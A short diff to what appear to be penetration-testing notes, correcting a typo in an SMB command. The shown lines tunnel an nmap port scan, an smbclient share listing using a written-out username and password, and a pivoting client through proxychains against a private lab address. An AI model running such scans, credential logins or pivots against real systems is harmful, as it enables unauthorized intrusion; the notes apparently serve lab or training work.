@@ -160,7 +160,7 @@ sudo proxychains nmap -sT -p4870-4874 -Pn 172.16.175.217
 [proxychains] config file found: /etc/proxychains.conf
 
 # SMB Attack
-proxychains smbclient -p 445 -L //s172.16.175.217/ -U hr_admin --password=Welcome1234
+proxychains smbclient -p 445 -L //172.16.175.217/ -U hr_admin --password=Welcome1234
 
 # Other
 proxychains ./ssh_dynamic_remote_client_aarch64 --ip-addr 172.16.175.217 --port 1234
